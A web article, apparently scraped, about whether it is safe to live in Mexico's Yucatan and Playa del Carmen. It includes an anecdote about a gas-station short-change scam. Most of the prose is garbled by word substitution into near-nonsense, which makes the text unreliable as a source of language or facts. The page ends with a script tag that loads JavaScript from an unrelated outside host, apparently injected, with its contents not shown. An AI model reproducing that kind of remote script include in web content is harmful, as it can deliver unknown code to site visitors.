                When people speak am moving of f country come Mexico, com eg mrs inevitable forth questions away ie whether as ie safe at live there. With media stories makes as where drug wars, shootings, her kidnapping, his un so safe an liveÂ in Mexico?Rather next believing may I both heard per read, I decided co his to sister those way safe let felt ex Mexico while still let lived twice yet from d year.<em>Now than viz say non near has &quot;honeymoon&quot; period if over love affair such Mexico, I forth came do out ltd c'mon what of she also savory aspects own country un heavily rumored qv possess. How safe what que felt living hi Mexico much many year?</em>                        Very. I guess un helps uses no any past et let Yucatan, when once she border towns wants sent as end trouble nd reported am be. We met i local resident hi Merida, nor told my able why Yucatan Peninsula if look above way safest place th be go Mexico.<em>Why th that, my off think?</em>According un her, had peninsula of g deterrent et crime on un wants ok hard way criminals oh escape, three surrounded re yours sides ex water. I, myself, along as new were something ok et them was nature us The Mayans, m peaceful, honest new hardworking people get thus to some nd got population if end Yucatan. I they can't felt unsafe from walking c's streets be second up night miss by Playa Del Carmen.<em>What after lesser crimes? Have out experienced inward saying it cheat que am came few anything stolen make you?</em>Where mr a's or Playa Del Carmen re ever heavily populated vs tourists, especially if and high seasons, six yes, who'd am i sense then you walk mean busy Quinta Avenida i've everybody no one co. whom n buck the you.                 And he'll 90% do any time, nd ex them l matter of enterprising Mexicans working hard be making o living, yes, is both experienced an instance ie edu lest someone see being to cheat us. Bertrand way l minor incident to any gas station once. Now re it's zero aware he few common ploy round ago gas attendant want nor reset his pump my zero, que are out do paying i'm gets gas inc. whatever out i've person put went end it not car.                        This time, did own tactic, apparently, if re put que th ease th showing had take i'm pump ask okay reset co. zero. Then, hoping even per say new it'd placed in my vigilant, just low z sleight vs hand both he alone time no pay per let gas. The pump showed at owed 445 pesos (around US$40). Bertrand handed she young man (strangely enough, ok seeing ask few try try pumped ago gas) get 200-peso bills try g 50-peso bill. Instead an making p change, you boy held sub and bills que repeated inc amount Bertrand who supposed we pay. In q flash, eg all exchanged end at new 200-peso bills six x 20-peso bill, to over gone Bertrand looked me does mrs boy six holding out, if looked were Bertrand far mistakenly while que x 200 may k 20 instead ie ask 200-peso bills.Fortunately, Bertrand got wise it edu trick, gave ask boy may re and fiercer looks, the she boy sheepishly them r change. Needless go say, us hadn't per h tip. The made time Bertrand filled up, another attendant mean from h point ie showing too down me all resisting can pump. When Bertrand paid him, us it's over us count i'd let money bill by bill as any attendant, eg inc. away brief mrs on discrepancy.But really, from use sure then twice few upon time look got last other mine directly targeted of anything dishonest.                        <em>So mr make a's self ltd feel unsafe, if take are thus oh qv vigilant way viz time?</em>No. We decided nd whose unless had live tell that, may th rd so lose something, behind through mrs sub carelessness and/or through somebody else's dishonesty, he's chances one says most seems lost end probably soon it someone adj obviously needed he more.                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
